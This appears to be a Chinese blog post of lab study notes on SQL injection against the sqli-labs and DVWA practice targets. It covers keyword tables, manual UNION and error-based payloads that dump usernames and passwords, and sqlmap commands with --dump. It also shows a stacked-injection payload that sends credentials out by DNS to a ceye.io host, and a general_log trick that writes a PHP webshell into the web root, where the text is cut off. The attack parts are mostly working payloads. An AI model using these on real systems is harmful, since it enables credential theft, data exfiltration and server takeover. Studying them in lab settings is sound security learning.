+<meta name="twitter:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/%E5%B1%95%E7%A4%BA%E5%88%97%E6%B5%8B%E8%AF%95.png">
+
+<link rel="canonical" href="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title> | 学习小屋</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">学习小屋</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="wuyaxiao">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="学习小屋">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-09-23 16:24:26" itemprop="dateCreated datePublished" datetime="2025-09-23T16:24:26+08:00">2025-09-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-07-20 01:30:05" itemprop="dateModified" datetime="2026-07-20T01:30:05+08:00">2026-07-20</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="SQL注入基础知识"><a href="#SQL注入基础知识" class="headerlink" title="SQL注入基础知识"></a>SQL注入基础知识</h2><h3 id="SQL注入中常用的关键字和系统表和函数"><a href="#SQL注入中常用的关键字和系统表和函数" class="headerlink" title="SQL注入中常用的关键字和系统表和函数"></a>SQL注入中常用的关键字和系统表和函数</h3><p>sql注入中常用到的sql关键字</p>
+<table>
+<thead>
+<tr>
+<th align="center">表达式</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">union</td>
+<td align="center">将查询结果进行联合输出，追加在列尾</td>
+</tr>
+<tr>
+<td align="center">union all</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">load</td>
+<td align="center">文件读取</td>
+</tr>
+<tr>
+<td align="center">into outfile</td>
+<td align="center">文件写入</td>
+</tr>
+<tr>
+<td align="center">@@datadir</td>
+<td align="center">数据库文件存放路径</td>
+</tr>
+<tr>
+<td align="center">user()</td>
+<td align="center">当前用户</td>
+</tr>
+<tr>
+<td align="center">version()</td>
+<td align="center">数据库版本</td>
+</tr>
+<tr>
+<td align="center">database()</td>
+<td align="center">数据库名称</td>
+</tr>
+<tr>
+<td align="center">sleep(n)</td>
+<td align="center">延时执行n秒</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>@@表示系统变量</p>
+</blockquote>
+<p>mysql中常用的系统表</p>
+<table>
+<thead>
+<tr>
+<th align="center">数据库</th>
+<th align="center">表名</th>
+<th align="center">描述</th>
+<th align="left"></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">information_schema</td>
+<td align="center">tables</td>
+<td align="center">mysql中存储的全部表名，使用table_schema指定数据库名</td>
+<td align="left">select table_schema.tables where table_scheama&#x3D;数据库名</td>
+</tr>
+<tr>
+<td align="center">information_schema</td>
+<td align="center">columns</td>
+<td align="center">mysql中存储全部其他表的字段名，使用table_name指定表名</td>
+<td align="left">select information_schema.columns where table_name&#x3D;表名</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>Information_schema是mysql中自带的一个数据库，这个数据库中包含了其他数据的各种信息，包括数据库中的表名、权限、字段名等。</p>
+</blockquote>
+<p>mysql常用的函数</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>作用</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>group_concat()</td>
+<td>非常关键。将查询到的多行数据（如表名、列名、用户名和密码）合并成一个单行字符串并用逗号分隔，方便在网页上一次性显示。虽然AI说它可以与limit合用但是不知道为什么我在测试的时候并没有分页。</td>
+<td></td>
+</tr>
+<tr>
+<td>char()</td>
+<td>将数字转换为对应的 ASCII 字符。常用于注入时构造无法直接输入的字符串，例如空格 char(32) 或在盲注中构造查询。</td>
+<td></td>
+</tr>
+<tr>
+<td>concat()</td>
+<td>用于横向拼接一行中的多个列或字符串。</td>
+<td></td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>由于有一些代码会只返回一行查询结果所以要用到<code>group_concat()</code></p>
+</blockquote>
+<h3 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h3><h4 id="1-注入点测试"><a href="#1-注入点测试" class="headerlink" title="1.注入点测试"></a><strong>1.注入点测试</strong></h4><blockquote>
+<p>可能存在的注入点：</p>
+<ol>
+<li><strong>数据查询参数 (GET&#x2F;POST)</strong></li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>注入位置</th>
+<th>示例代码中的变量</th>
+<th>注入示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>GET URL 参数</strong></td>
+<td><code>...page.php?id=123</code></td>
+<td>URL 中 <code>id</code> 的值：<code>123&#39; OR 1=1 --</code></td>
+</tr>
+<tr>
+<td><strong>POST 表单数据</strong></td>
+<td><code>username=admin&amp;password=...</code></td>
+<td>表单字段 <code>username</code> 的值：<code>admin&#39; OR 1=1 --</code></td>
+</tr>
+<tr>
+<td><strong>URL 路径（RESTful）</strong></td>
+<td><code>/api/users/123/</code></td>
+<td>路径中的数字或字符串：<code>/users/123&#39; --/</code></td>
+</tr>
+</tbody></table>
+<ol start="2">
+<li><strong>HTTP 请求头 (HTTP Headers)</strong></li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>注入位置</th>
+<th>常见用法</th>
+<th>注入示例 (通过 Burp Suite 等工具修改)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Cookie</strong></td>
+<td>存储会话 ID、用户偏好</td>
+<td><code>Cookie: user_id=123&#39;</code></td>
+</tr>
+<tr>
+<td><strong>User-Agent</strong></td>
+<td>记录用户的浏览器信息</td>
+<td><code>User-Agent: ...&#39; AND 1=1 --</code></td>
+</tr>
+<tr>
+<td><strong>Referer</strong></td>
+<td>记录用户来源页面</td>
+<td><code>Referer: ...&#39; AND 1=1 --</code></td>
+</tr>
+<tr>
+<td><strong>X-Forwarded-For</strong></td>
+<td>记录用户的真实 IP (常用于日志记录)</td>
+<td><code>X-Forwarded-For: 127.0.0.1&#39;)</code></td>
+</tr>
+</tbody></table>
+<ol start="3">
+<li><strong>排序和过滤机制 (ORDER BY &#x2F; GROUP BY)</strong></li>
+</ol>
+<p>当应用程序允许用户动态选择数据的<strong>排序依据 (ORDER BY)</strong> 或<strong>分组依据 (GROUP BY)</strong> 时，如果处理不当，也会导致注入。</p>
+<table>
+<thead>
+<tr>
+<th>注入位置</th>
+<th>场景描述</th>
+<th>注入示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>ORDER BY</strong></td>
+<td>用户从下拉菜单选择按 <code>name</code> 或 <code>price</code> 排序。</td>
+<td>用户传递的值可能是：<code>price, (SELECT sleep(5))</code></td>
+</tr>
+<tr>
+<td><strong>LIMIT &#x2F; OFFSET</strong></td>
+<td>分页功能，用于限制返回的行数。</td>
+<td>限制参数的值可能是：<code>10 OFFSET 0 UNION SELECT ...</code></td>
+</tr>
+</tbody></table>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/abc.php?id=1&#x27;    http://xxx/abc.php?id=1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>如果在一个 URL 参数后多加一个引号 导致页面报错，那么就说明这个参数（注入点）的值直接被当作了 SQL 代码的一部分，因此存在注入漏洞。</p>
+<p>但是如果没有报错只是返回不正常不代表没有注入点，可以进行数字型和字符型注入点检测进一步排查。</p>
+<p><strong>数字型检测-select * from &lt;表名&gt; where &lt;列名&gt; &#x3D; x</strong></p>
+<p> 当输入变量的类型为数字类型时，可以使用and 1&#x3D;1和and 1&#x3D;2配合进行注入点类型进行检测:</p>
+<ol>
+<li>Url 地址中输入 <code>http://xxx/abc.php?id=x and 1=1</code> 页面依旧运行正常，继续进行下一步。</li>
+<li>Url 地址中继续输入 <code>http://xxx/abc.php?id=x and 1=2</code> 页面运行错误，则说明此 Sql 注入为数字型注入。</li>
+</ol>
+<blockquote>
+<p>如果注入点类型为字符型，注意这里也可能会返回结果，因为MySQL存在隐式转换，可能会将字符串<code>x and 1=1</code>转换为<code>x</code></p>
+</blockquote>
+<p><strong>字符型注入点检测-select * from &lt;表名&gt; where &lt;列名&gt; &#x3D; ‘x’</strong></p>
+<p> 1.Url 地址中输入 <code>http://xxx/abc.php?id=x&#39; and &#39;1&#39;=&#39;1</code> 页面依旧运行正常，继续进行下一步。</p>
+<p> 2.Url 地址中继续输入 <code>http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;2</code> 页面运行错误，则说明此 Sql 注入为数字型注入。</p>
+<blockquote>
+<p>常见闭合方式总结：单引号；双引号；单引号加括号；双引号加括号；括号</p>
+<p>PS:括号可以有不止一个</p>
+</blockquote>
+<h4 id="2-当前表行数测试"><a href="#2-当前表行数测试" class="headerlink" title="2.当前表行数测试"></a><strong>2.当前表行数测试</strong></h4><p>要进行列数测试要使用order by进行测试，不断增加后面的数字，直到出错为止。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/abc.php?id=x order by 8</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-测试当前表中哪些列有回显"><a href="#3-测试当前表中哪些列有回显" class="headerlink" title="3.测试当前表中哪些列有回显"></a><strong>3.测试当前表中哪些列有回显</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/abc.php?id=x and 1=2 union select 1,2%23</span><br></pre></td></tr></table></figure>
+
+<p>利用了<code>union select</code>要求列必须相同的特点</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/%E5%B1%95%E7%A4%BA%E5%88%97%E6%B5%8B%E8%AF%95.png" alt="img"></p>
+<h4 id="4-查询数据库名称"><a href="#4-查询数据库名称" class="headerlink" title="4.查询数据库名称"></a><strong>4.查询数据库名称</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/abc.php?id=x and 1=2 union select 1,database()--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0%E8%8E%B7%E5%8F%96.png" alt="img"></p>
+<h4 id="5-数据表名获取"><a href="#5-数据表名获取" class="headerlink" title="5.数据表名获取"></a><strong>5.数据表名获取</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/abc.php?id=x and 1=2 union select 1,table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-%E8%A1%A8%E5%90%8D%E8%8E%B7%E5%8F%96.png" alt="img"></p>
+<h4 id="6-字段获取"><a href="#6-字段获取" class="headerlink" title="6.字段获取"></a><strong>6.字段获取</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/abc.php?id=x and 1=2 union select 1,column_name from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-%E8%A1%A8%E4%B8%AD%E5%88%97%E5%90%8D%E8%8E%B7%E5%8F%96.png?raw=true" alt="img"></p>
+<p> 从上面的例子中我们可以看到在users表中存在着User和Password两个字段保存着网站管理员的用户和密码，接下来就可以直接对这两列的内容进行获取了。</p>
+<h4 id="7-读取关键字段"><a href="#7-读取关键字段" class="headerlink" title="7.读取关键字段"></a><strong>7.读取关键字段</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/abc.php?id=x and 1=2 union select user,password from dvwa.users --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96.png" alt="img"></p>
+<h3 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h3><h4 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h4><h5 id="1-判定是否存在注入点"><a href="#1-判定是否存在注入点" class="headerlink" title="1.判定是否存在注入点"></a><strong>1.判定是否存在注入点</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://xxx/id=??? --batch</span><br><span class="line">	--batch:表示全部需要人机交互的部分采用默认选项进行选择</span><br><span class="line">	--cookie: cookie为可选项，如果要使用登录的请求应该先使用brupsuite来进行抓包查看ccokie写入该参数</span><br><span class="line">	--r: post方式进行注入，先使用bp抓到完整的包，然后保存为一个文件，这里直接使用-r进行指定</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/sqlmap%E6%B3%A8%E5%85%A5%E7%82%B9%E6%A3%80%E6%B5%8B2.png" alt="img"></p>
+<p>输出结果：</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/sqlmap%E6%B3%A8%E5%85%A5%E7%82%B9%E6%A3%80%E6%B5%8B.png" alt="img"></p>
+<h5 id="2-数据库名获取"><a href="#2-数据库名获取" class="headerlink" title="2.数据库名获取"></a><strong>2.数据库名获取</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://xxx/id=???&quot;   --current-db --batch</span><br><span class="line">	--cunrrent-db</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/sqlmap%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8E%A2%E6%B5%8B2.png" alt="img"></p>
+<p>输出结果：</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/sqlmap%E6%95%B0%E6%8D%AE%E6%8E%A2%E6%B5%8B.png" alt="img"></p>
+<h5 id="3-获取数据库中的表名"><a href="#3-获取数据库中的表名" class="headerlink" title="3.获取数据库中的表名"></a><strong>3.获取数据库中的表名</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://xxx/id=???&quot;  -D 数据库名称 --tables --batch</span><br><span class="line">-D：指定要探测数据库名称</span><br><span class="line">--tables：进行表名探索选项</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/sqlmap%E6%95%B0%E6%8D%AE%E8%A1%A8%E6%8E%A2%E6%B5%8B2.png" alt="img"></p>
+<p>输出结果：</p>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap%E6%95%B0%E6%8D%AE%E8%A1%A8%E6%8E%A2%E6%B5%8B.png?raw=true" alt="img"></p>
+<h5 id="4-对选定表的列名进行获取"><a href="#4-对选定表的列名进行获取" class="headerlink" title="4.对选定表的列名进行获取"></a><strong>4.对选定表的列名进行获取</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://xxx/id=???&quot;  -D 数据库名称 -T 表名 --columns --batch</span><br><span class="line">	-D：指定要进行探索的表</span><br><span class="line">	-columns：进行字段名称探索选项</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/sqlmap%E5%AD%97%E6%AE%B5%E6%8E%A2%E6%B5%8B2.png" alt="img"></p>
+<p>输出结果：</p>
+<p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap%E5%AD%97%E6%AE%B5%E6%8E%A2%E6%B5%8B.png?raw=true" alt="img"></p>
+<h5 id="5-探测用户名密码"><a href="#5-探测用户名密码" class="headerlink" title="5.探测用户名密码"></a><strong>5.探测用户名密码</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> 获取用户名和密码并保存到指定文件</span><br><span class="line">python sqlmap.py -u &quot;http://xxx/id=???&quot;  -D 数据库名称 -T 表名 -C 用户名列名,密码列名 --dump</span><br><span class="line">	-C:指定选择的列名</span><br><span class="line">	--dump：将内容输出到文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/sqlmap%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E6%95%B0%E6%8D%AE%E8%AF%BB%E5%8F%962.png" alt="img"></p>
+<p>输出结果：</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/sqlmap%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E6%95%B0%E6%8D%AE%E8%AF%BB%E5%8F%96.png" alt="img"></p>
+<h4 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h4><p>可以直接将 Burpsuite 截取的数据包内容保持为文本格式 <code>test.txt</code>：</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005114241093.png" alt="image-20251005114241093"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r test.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005123121454.png" alt="image-20251005123121454"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005123056614.png" alt="image-20251005123056614"></p>
+<p>检测到以后其余过程与GET相同</p>
+<h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><h4 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h4><p>和普通注入大致流程相同</p>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><blockquote>
+<p>​    updatexml() 函数和extractvalue()的报错内容长度不能超过 32 个字符，当我们查询的内容较短时可以完整显示，若查询内容较长，则导致我们要查询的的内容显示不全。</p>
+</blockquote>
+<p>updatexml报错注入</p>
+<p><code>UPDATE_XML()</code> 函数的原始作用是 <strong>更新 XML 文档中特定节点的值</strong>。它的完整语法是<code>UPDATEXML(xml_target, xpath_expression, new_value)</code></p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义</th>
+<th>预期类型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>xml_target</td>
+<td>要操作的 XML 文档（XML 字符串）。</td>
+<td>XML</td>
+</tr>
+<tr>
+<td>xpath_expression</td>
+<td>用于定位 XML 文档中节点的 XPath 路径。</td>
+<td>字符串</td>
+</tr>
+<tr>
+<td>new_value</td>
+<td>要插入或替换的新值。</td>
+<td>字符串</td>
+</tr>
+</tbody></table>
+<p>攻击者的构造方式是：</p>
+<ol>
+<li>将 <code>xpath_expression</code> 参数替换成一个包含 <code>CONCAT()</code> 和 敏感查询 的组合。</li>
+<li>例如：<code>CONCAT(0x7e, (SELECT database()), 0x7e)</code><ul>
+<li><code>0x7e</code> 是波浪线 <code>~</code> 的十六进制编码，主要是为了<code>UPDATEXML</code> 的第二个参数一定是一个合法的路径。</li>
+<li><code>(SELECT database())</code> 是攻击者想要获取的真实数据（例如数据库名）。</li>
+</ul>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-5/?id=1&#x27; union select 1,2,updatexml(1,concat(0x7e,(select database()),0x7e),3)--+</span><br><span class="line">http://localhost/Less-5/?id=1&#x27; union select 1,2,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),3)--+</span><br><span class="line">http://localhost/Less-5/?id=1&#x27; union select 1,2,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x7e),3)--+</span><br><span class="line">http://localhost/Less-5/?id=-1&#x27; union select 1,2,updatexml(1,concat(0x7e,(select concat(username,&#x27;:&#x27;,password) from security.users limit 1,1),0x7e),3)--+</span><br></pre></td></tr></table></figure>
+
+<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>MySQL 的命令行中，每一条语句以 <code>;</code> 结尾，这代表语句的结束，如果在注入过程中在 <code>;</code> 后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。下面就是简单的示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id = 1;select version();</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">+-------------------------+</span><br><span class="line">| version()               |</span><br><span class="line">+-------------------------+</span><br><span class="line">| 5.5.44-0ubuntu0.14.04.1 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p><code>mysqli_multi_query</code> 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句。</p>
+<h5 id="DNSLog数据外带"><a href="#DNSLog数据外带" class="headerlink" title="DNSLog数据外带"></a>DNSLog数据外带</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;;</span><br><span class="line">select load_file(concat(&#x27;\\\\&#x27;,(select hex(concat_ws(&#x27;~&#x27;,username,password)) from users limit 0,1),&#x27;.gvc791.ceye.io\\abc&#x27;))</span><br><span class="line">--+</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>?id=1&#39;;</code>: 闭合了 <code>id</code> 字段的单引号，并开始一个新的查询。</li>
+<li><code>SELECT load_file(CONCAT(...))</code>: 调用 <code>LOAD_FILE</code> 函数，强制进行网络访问。</li>
+<li><code>HEX(CONCAT_WS(&#39;~&#39;, username, password)) FROM users limit 0,1</code>: 提取第一个用户的 <code>username</code> 和 <code>password</code>，用 <code>~</code> 分隔后，全部编码成 Hex 字符串。</li>
+<li><code>&#39;\\\\&#39;</code> + Hex 数据 + <code>&#39;.gvc791.ceye.io\\abc&#39;</code>: 构造出完整的 UNC 路径和恶意域名，例如： <code>\\61646d696e7e70617373776f7264.gvc791.ceye.io\abc</code></li>
+<li><strong><code>--+</code></strong>: 注释掉 SQL 语句的剩余部分。</li>
+</ol>
+<p>执行结果是 MySQL 服务器尝试解析 <code>61646d696e7e70617373776f7264.gvc791.ceye.io</code> 这个域名，数据即通过 DNS 协议成功外带。</p>
+<p>需要条件：</p>
+<ol>
+<li>MySQL 开启 load_file ()</li>
+<li>DNSLog 平台 （<a target="_blank" rel="noopener" href="http://hyuga.co/">Hyuga</a>、<a target="_blank" rel="noopener" href="http://ceye.io/">CEYE</a>）</li>
+<li>Windows 平台:因为 <code>LOAD_FILE()</code> 函数只有在 Windows 系统中支持解析 UNC 路径，从而触发 DNS 查询。</li>
+</ol>
+<h5 id="开启日志Getshell"><a href="#开启日志Getshell" class="headerlink" title="开启日志Getshell"></a>开启日志Getshell</h5><p>利用 MySQL 的日志功能，将恶意的 PHP 代码（WebShell）作为日志内容，写入到 Web 目录下的一个 PHP 文件中，从而远程控制服务器。开启general_log然后修改日志文件的位置。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;;set global general_log = &quot;ON&quot;;set global general_log_file=&#x27;/var/www/html/shell.php&#x27;;--+</span><br></pre></td></tr></table></figure>
+
+<p>接下来就可以在日志文件里面写入恶意代码。</p>
+<p>输入<code>?id=1&#39;;select &lt;?php phpinfo();?&gt;</code>,日志文件显示如下：</p>
